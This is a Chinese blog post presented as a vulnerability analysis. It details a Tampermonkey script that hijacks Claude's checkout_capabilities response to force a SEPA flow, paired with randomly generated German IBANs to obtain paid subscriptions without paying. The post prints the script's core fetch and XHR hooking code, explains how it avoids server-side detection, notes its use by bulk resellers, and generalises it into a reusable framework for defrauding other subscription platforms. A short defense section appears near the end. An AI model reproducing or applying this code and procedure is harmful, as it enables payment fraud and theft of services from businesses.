---
title: "焚决 Claude — 一个油猴脚本如何撬开 Anthropic 的支付大门"
date: 2026-07-26T04:49:00+08:00
draft: false
weight: 1
categories: ["漏洞分析", "支付安全", "Web 安全"]
tags: ["Claude", "订阅漏洞", "API 劫持", "Tampermonkey", "SEPA", "支付安全", "漏洞复现", "客户端安全"]
description: "深入拆解传说中的「焚决」——通过 Tampermonkey 油猴脚本劫持 checkout_capabilities API 响应，前端注入 cassia 支付流，配合随机德国 IBAN 实现 Claude Max/Pro 零元订阅。完整技术分析：Fetch/XHR 双通道拦截、SEPA CORE 直接借记清算机制、MOD 97-10 校验算法局限性、客户端信任边界漏洞的通用攻击框架与防御方案。"
---

{{< figure src="/images/wechat-qr.jpg" alt="微信二维码" width="200" >}}
**联系方式 & 交流群**

- **QQ**: 46333839
- **微信**: GOV-HACK

添加微信进微信交流群，各位觉得文章对你有帮助的话可否打赏一些呀~

---

> **⚠️ 时效性提醒**：本文发布于 2026 年 7 月，文中涉及的 API 端点、支付流参数均为发布时有效值。Anthropic 随时可能修改 `checkout_capabilities` 响应结构或在后端追加校验逻辑，届时本方法将失效。本文保留仅供安全研究与客户端安全防御参考。

---

## 前言

最近圈子里流传着一个叫**「焚决」**的东西，名字取得很玄，搞得好像什么了不得的秘术。拿到手一看——是一段不到 200 行的 Tampermonkey 油猴脚本。

但别小看这 200 行代码。它干了一件非常漂亮的事情：在你打开 Claude 网页版准备付费订阅的瞬间，在浏览器内部悄无声息地篡改了一个 API 响应，把你看到的支付页面从信用卡表单换成了 SEPA 银行转账。然后你去 `randomiban.com` 随便生成一个德国银行账号，填进去，提交——**Claude Max 到手，扣款金额 0 元。**

这玩意在外面传得沸沸扬扬，各路卡网卖的廉价 Claude 会员，相当一部分就是靠这个批量生产的。

今天咱们把它彻底拆开。不光讲它怎么工作，更要讲**为什么能成**、**它利用了支付系统的哪个结构性缺陷**、以及**这种攻击模式怎么迁移到其他平台**。

---

## 一、攻击全景：一个 API 字段改写引发的连锁反应

### 正常的 Claude 订阅流程

打开 `claude.ai`，点击升级订阅，前端第一件事不是弹出支付表单——它先问后端一个问题：

```
GET /api/organizations/{org_id}/subscription/checkout_capabilities
```

这个接口的职责很简单：**告诉前端，当前这个用户应该走哪条支付通道。** 后端会综合 IP 地理位置、账号注册区域、浏览器 Accept-Language 等信号，返回一个支付流标识：

```json
{
  "checkout_flow": "stripe"
}
```

前端拿到 `stripe`，渲染信用卡表单——卡号、有效期、CVV、3DS 二次验证，一套标准流程。信用卡支付是同步授权的，银行实时校验，过不了就是过不了。

### 劫持后的流程

脚本做的事情只有一件：**把所有命中 `checkout_capabilities` 的响应体替换为**：

```json
{
  "checkout_flow": "cassia"
}
```

`cassia` 是 Anthropic 内部用于欧洲 SEPA 银行转账的支付流标识。前端一看返回值变了，渲染逻辑直接切换——不再是信用卡表单，而是一个 IBAN 输入框。

这时候去 randomiban.com 生成一个德国 IBAN（格式：`DE` + 2 位校验码 + 8 位银行代码 + 10 位账号，共 22 位），填进去，点提交。

前端校验？只检查 IBAN 格式是否合法（MOD 97-10 校验通过即可）。

后端校验？SEPA 体系下，**提交时不做实时账户验证**。

**结果：Claude 立刻给你开通了订阅。**

---

## 二、SEPA 直接借记——为什么填个假账号也能过

这是整个攻击的核心利用点，不理解 SEPA 的清算机制，就不可能理解这个漏洞为什么成立。

### 先搞清楚 SEPA 是什么

SEPA（Single Euro Payments Area，单一欧元支付区）覆盖 36 个欧洲国家和地区，是欧盟推动的统一支付基础设施。其中的 **SEPA Direct Debit**（直接借记，德语叫 Lastschriftverfahren）允许商家向消费者的银行账户"拉钱"——不是你给商家转账，而是商家拿着你的授权凭证去你的银行把钱取走。

听起来很方便对吧？问题就出在这个"拉钱"的流程设计上。

### 信用卡 vs SEPA 直接借记：两套完全不同的信任模型

| | 信用卡（Stripe 标准流） | SEPA 直接借记（cassia 流） |
|---|---|---|
| **授权模式** | 同步在线授权 | 异步离线扣款 |
| **交易发起时校验** | 卡号 Luhn 校验 + CVV 验证 + 3DS 二次认证 + 银行实时授权 | IBAN MOD 97-10 格式校验，**仅此而已** |
| **银行参与时机** | 交易发起的瞬间 | 交易发起后的 1-3 个工作日 |
| **资金确认** | 毫秒级返回授权结果 | 银行不返回任何确认，排队等清算 |
| **消费者保护** | Chargeback 争议流程 | **8 周无条件撤回权**（SEPA CORE 规则） |

看到关键区别了吗？信用卡在你点击支付的**那一瞬间**就跟银行确认了你有没有钱、卡号对不对、你本人是不是同意的。而 SEPA 直接借记**完全不做这些**——它只检查 IBAN 的格式，然后把扣款请求扔进银行间的批量清算队列里，等着慢慢处理。

### SEPA CORE 清算流程

实际的清算过程是这样的：

```
你提交 IBAN
  ↓
支付网关做 MOD 97-10 校验（纯数学公式，检查 IBAN 格式是否合法）
  ↓
校验通过 → 支付网关返回"交易成功"
  ↓
Anthropic 收到成功信号 → 开通你的 Claude Max 订阅
  ↓
... T+1 到 T+3 工作日 ...
  ↓
扣款请求进入 SEPA CORE 清算系统
  ↓
商家银行 → 消费者银行：请从账号 DEXX XXXX XXXX XXXX XXXX XX 扣 $20
  ↓
消费者银行查询账号 → 账号不存在 / 余额不足 / 未授权
  ↓
返回 R 代码拒绝（R02=无效账号, R04=账户已关, R05=被授权人撤销...）
  ↓
Anthropic 收到扣款失败通知 → 关闭你的订阅
```

**重点来了：从你提交 IBAN 到银行清算出结果，中间有一个 1-3 个工作日的真空期。** 在这段时间里，你的 Claude Max 订阅是完全生效的——能用 Opus、能用所有高级功能、流量不限。

### MOD 97-10：格式校验的局限性

IBAN 的校验算法叫 ISO 7064 MOD 97-10，原理其实很简单：

1. 把 IBAN 的国家代码和校验码移到末尾
2. 把字母转换为数字（A=10, B=11, ..., Z=35）
3. 对整个大整数做 MOD 97 运算
4. 结果等于 1 就合法

这个算法能检出什么？**格式错误**——打错了某一位、漏了一位、国家代码不对。

这个算法检不出什么？**一切跟真实世界有关的东西**——账户是否存在、余额是否充足、持有人是不是你。

`randomiban.com` 生成的 IBAN 就是利用了这一点：它按照 MOD 97-10 算法逆向构造，生成的 IBAN **格式 100% 合法**，能通过任何基于此算法的前端和后端校验。至于这个账号在不在现实中存在——那是 3 天后银行清算时才会发现的事情。

### 为什么偏偏是德国 IBAN？

SEPA 覆盖 36 个国家，为什么脚本选了德国（DE）？

1. **格式最简单**：DE 开头的 IBAN 固定 22 位，结构是 `DE + 2位校验码 + 8位银行代码(BLZ) + 10位账号`，没有额外的国家级校验叠加
2. **通过率最高**：德国 IBAN 在 Stripe 等主流支付网关的接受度最好，不会触发额外的地区风控
3. **银行代码空间大**：8 位 BLZ 有大量有效的银行代码段，随机生成碰上有效 BLZ 前缀的概率不低

对比一下法国 IBAN（27 位，还有额外的 RIB 密钥校验）或者西班牙 IBAN（24 位，有 DC 校验位），德国确实是阻力最小的选择。

---

## 三、脚本逐行技术拆解

理解了 SEPA 的机制，再来看脚本本身就清晰多了。每一个设计决策都有明确的技术理由。

### 3.1 元数据——抢在一切之前

```javascript
// @name         TestExample Cassia Response Mock
// @match        *://claude.ai/*
// @match        *://*.claude.ai/*
// @run-at       document-start
// @grant        none
// @sandbox      raw
```

三个关键设定：

- **`@run-at document-start`**：页面 DOM 还没开始构建，脚本已经注入完毕。这不是可选项——如果等到 `document-idle`，`checkout_capabilities` 的请求可能已经发出去了，Hook 就晚了。整个攻击成立的前提就是**比目标请求更早完成注入**。

- **`@sandbox raw`**：绕过 Tampermonkey 的安全沙箱。默认沙箱会隔离脚本的执行上下文，导致你覆盖的 `window.fetch` 和页面实际用的 `window.fetch` 不是同一个。`raw` 模式下脚本直接在页面上下文中执行，Hook 才能真正生效。

- **`@grant none`**：不申请 `GM_*` 系列 API 权限。一方面减少 Tampermonkey 的安全提示弹窗，另一方面 `@sandbox raw` 本身就不兼容 `GM_*` API。

### 3.2 精确制导——只改一个接口

```javascript
const TARGET_PATH =
  /^\/api\/organizations\/[^/]+\/subscription\/checkout_capabilities\/?$/;
```

正则匹配精确到路径段，连末尾有没有斜杠都考虑了。**只拦截这一个接口，其他所有请求原样放行。**

为什么是这个接口？因为它是 Claude 前端支付流的**单一决策点**——前端根据它的返回值决定渲染 Stripe 信用卡表单还是 SEPA IBAN 输入框。控制了这个响应，就控制了用户看到的整个支付界面。

这种精准度也是为了隐蔽性——如果你 Hook 了所有请求，前端的行为会出各种异常，容易暴露。只改一个接口，前端其他部分的运行完全正常。

### 3.3 Fetch 拦截——先发后改

```javascript
const nativeFetch = window.fetch;

window.fetch = async function (input, init) {
  const method = init?.method ||
    (input instanceof Request ? input.method : "GET");

  const targetUrl = getTargetUrl(input, method);
  const originalResponse = await nativeFetch.apply(this, arguments);

  if (!targetUrl) {
    return originalResponse;
  }

  return createMockResponse(originalResponse);
};
```

注意调用顺序：**先用原生 `fetch` 把真实请求正常发出去，等拿到响应后再替换返回值。**

这是这个脚本最巧妙的地方。

如果直接拦截请求不发出去，构造一个假响应返回呢？功能上没问题。但从服务端的角度看——你打开了支付页面，前端应该调 `checkout_capabilities`，结果后端日志里根本没看到这个请求。这就是一个异常信号，可以被 Anthropic 的安全团队用于检测。

先发后改的策略完美回避了这个问题：服务端日志里看到了正常的 GET 请求、正常的 200 响应，一切如常。篡改发生在浏览器内部，从 HTTPS 加密通道往外看什么都没变。

### 3.4 Response 重构——细节决定成败

```javascript
function createMockResponse(originalResponse) {
  const headers = new Headers(originalResponse.headers);

  headers.delete("content-length");
  headers.delete("content-encoding");
  headers.delete("etag");
  headers.delete("content-md5");

  headers.set("content-type", "application/json; charset=utf-8");
  headers.set("content-length", String(MOCK_LENGTH));
  headers.set("cache-control", "no-store");

  const response = new Response(MOCK_BODY, {
    status: 200,
    statusText: "OK",
    headers
  });
```

逐个分析删掉的响应头：

- **`content-encoding`**：原始响应大概率是 gzip 或 br 压缩的。我们构造的 JSON 是明文，如果不删这个头，浏览器会拿着明文 JSON 去做 gzip 解压——直接炸。
- **`content-length`**：原始响应体大小和我们构造的不一样，不改的话浏览器会截断或报错。
- **`etag` / `content-md5`**：完整性校验头。原始响应的哈希和我们篡改后的内容对不上。虽然浏览器通常不强制校验这些头，但删掉更保险——万一前端代码拿这些值做了缓存校验呢。
- **`cache-control: no-store`**：强制不缓存。如果浏览器缓存了我们的假响应，下次刷新页面不走 Hook 了就拿到缓存的假数据——反而弄巧成拙。反过来，如果缓存了之前的真响应，前端可能直接用缓存不发请求，Hook 就没机会触发。`no-store` 确保每次都走网络请求，每次都经过 Hook。

### 3.5 XHR 双通道保险

脚本不光 Hook 了 `fetch`，还对 `XMLHttpRequest` 做了一套完整的拦截——覆盖了 `responseText`、`response`、`status`、`statusText`、`getResponseHeader`、`getAllResponseHeaders`。

为什么要两套？现代 Web 应用大多用 `fetch`，但你无法保证 Anthropic 的前端代码——或者它依赖的第三方库——不会在某些场景下 fallback 到 XHR。少 Hook 一个通道就是留了一条漏网之鱼。

XHR 的 Hook 方式也值得一看：

```javascript
function replaceXhrGetter(propertyName, replacement) {
  const descriptor =
    Object.getOwnPropertyDescriptor(XhrPrototype, propertyName);

  if (!descriptor || typeof descriptor.get !== "function" ||
      descriptor.configurable === false) {
    console.warn(`[Cassia Mock] 无法接管 XHR.${propertyName}`);
    return;
  }

  const nativeGetter = descriptor.get;

  Object.defineProperty(XhrPrototype, propertyName, {
    ...descriptor,
    get: function () {
      if (!getMatchedXhr(this)) {
        return nativeGetter.call(this);
      }
      return replacement.call(this, nativeGetter);
    }
  });
}
```

用 `Object.getOwnPropertyDescriptor` 先取原始的 property descriptor，再通过 `Object.defineProperty` 精确替换 getter。比直接赋值靠谱得多——它保留了原始 descriptor 的所有属性（`configurable`、`enumerable`），而且会先检查 `configurable` 是否为 `false`，如果属性被冻结就优雅降级而不是静默失败。

### 3.6 状态指示器

```javascript
const badge = document.createElement("div");
badge.id = "cassia-mock-badge";
badge.textContent = "Cassia Mock ON";
```

页面右下角一个绿色小角标，确认脚本已激活。实际攻击中这是个安慰剂——真正的确认是看支付页面有没有从信用卡变成 IBAN 输入框。但对于批量操作的卡商来说，这个视觉反馈能提高操作效率。

---

## 四、横向迁移：这不是一个漏洞，是一类漏洞

分析完焚决，我们跳出来看一个更有价值的问题：**这类攻击是可复用的。**

### 漏洞本质

> **客户端信任边界缺失**：服务端将支付流的决策权——"这个用户该走哪条支付通道"——交给了一个客户端可以任意篡改的 API 响应。

这不是孤例。回顾我们之前分析过的一系列支付漏洞，它们共享同一个底层模式：

| 漏洞 | 被篡改的对象 | 信任边界裂缝 |
|------|------------|-------------|
| **焚决（本例）** | `checkout_capabilities` 响应 | 前端信任 API 返回值决定支付通道 |
| GPT Plus offerToken 注入 | Google Play Billing 内存中的 offerToken | 服务端不校验 token 与账号资格的绑定关系 |
| GPT iOS 收据复用 | Base64 App Store 收据 | 服务端不验证收据与提交者账号的对应关系 |
| Cloudflare Pro 竞态 | 并发请求的状态窗口 | 权限发放与支付确认之间存在可利用的时序差 |
| RevenueCat 回调劫持 | `fetch_token` 跨账号提交 | 第三方回调接口缺乏调用方鉴权 |

### 通用攻击模型

把这些漏洞抽象一下，可以提取出一个四步攻击框架：

```
1. 定位决策接口
   找到决定支付流 / 功能开关 / 定价计算的 API 端点
   信号关键词：checkout_capabilities, payment_methods, available_plans,
              eligible_promotions, feature_flags, entitlements

2. 注入篡改数据
   通过油猴脚本（Web）、MITM（移动端）、Frida Hook（Native）等
   方式替换响应内容

3. 选择确认延迟最长的路径
   SEPA 直接借记 > 银行转账 > PayPal > 信用卡
   延迟越长，时间窗口越大

4. 利用"前端校验 + 后端真空"
   前端校验通过后，后端在异步确认完成前不暂停服务发放
```

**这个框架可以复用到任何订阅制平台**，只要目标满足：

- 支付方式的选择依赖客户端可控状态
- 存在至少一种异步确认的支付方式
- "服务开通"发生在"支付确认"之前

在漏洞挖掘实战中，打开 DevTools Network 面板，搜索 `checkout`、`payment`、`billing`、`plan`、`subscription` 这些关键词，找到所有影响支付逻辑的端点，逐个测试响应注入——这就是最直接的攻击面枚举方式。

---

## 五、防御视角

### 给服务端开发者

1. **支付流决策必须服务端闭环**。`checkout_flow` 的值应该在后端根据用户地区、账号状态、风控信号独立计算，前端只是一个渲染器——它不应该有能力选择自己走哪条支付通道。

2. **异步支付必须延迟开通**。SEPA、银行转账这类异步支付方式，在银行返回扣款成功确认之前，不应该开通任何付费功能。可以给用户一个"支付处理中"的状态，等清算完成后再激活。

3. **API 响应签名**。对关键 API 响应做 HMAC 签名（密钥存服务端），前端消费前验签。虽然不能根治（攻击者可以 Hook 验签逻辑），但大幅提高了攻击门槛——从改一个 JSON 字段变成了还得逆向验签实现。

4. **IBAN 实时银行验证**。接入 SWIFT gpi 或各国央行的 IBAN 验证服务（如德国 Bundesbank 的 IBAN 验证接口），在提交时做实时的账户存在性校验，而不是只靠本地 MOD 97。

### 给安全研究者

这类漏洞的攻击面很清晰——任何一个返回了影响支付逻辑数据的 API 端点，且这个数据可以被前端篡改，都是潜在的攻击入口。

一些高价值的"信号接口"：

- `checkout_capabilities` / `payment_methods` / `available_plans`
- `region` / `locale` / `country_detection`
- `eligible_promotions` / `offers` / `discounts`
- `feature_flags` / `entitlements` / `subscription_tiers`

---

## 六、写在最后

焚决这个东西，技术上说穿了就是一个**客户端状态注入**工具。它不攻击 Claude 的认证系统，不碰 Anthropic 的服务器，攻击目标是**前端与后端之间那条看不见的信任边界**。

它的精妙不在于代码多复杂——说真的 200 行 JS 连个正经项目的单元测试都撑不满——而在于它精准地捏住了两个系统设计缺陷的交叉点：

- **Anthropic 的前端支付流由一个可篡改的 API 响应驱动**
- **SEPA 直接借记在清算完成前不验证账户真实性**

两个缺陷单独拿出来，各自都不算致命。但组合在一起，就变成了一条从"修改一个 JSON 字段"到"零元订阅 Claude Max"的完整攻击链。

而这类"信任边界错位 + 异步确认间隙"的组合漏洞，绝不仅限于 Claude。任何一个同时提供信用卡和 SEPA 支付的 SaaS 平台，如果支付通道的选择权交给了前端，都可能面临同样的问题。

**工具可以被修复，模式值得被记住。**

---

## 相关阅读

- [GPT Plus 订阅漏洞深度分析 — Google Play Billing 鉴权缺失导致 0 元订阅](/posts/gpt-plus-exploit-revenuecat-vulnerability/)
- [GPT Plus 收据复用漏洞 — iOS 收据验证缺陷](/posts/gpt-plus-receipt-vulnerability-2026/)
- [Cloudflare 计费逻辑缺陷 — 请求重放绕过订阅支付](/posts/manual-sec-20260519-cloudflare-billing-race-condition/)

---

**标签**: #Claude #支付安全 #API劫持 #客户端安全 #SEPA #Tampermonkey #漏洞分析 #焚决
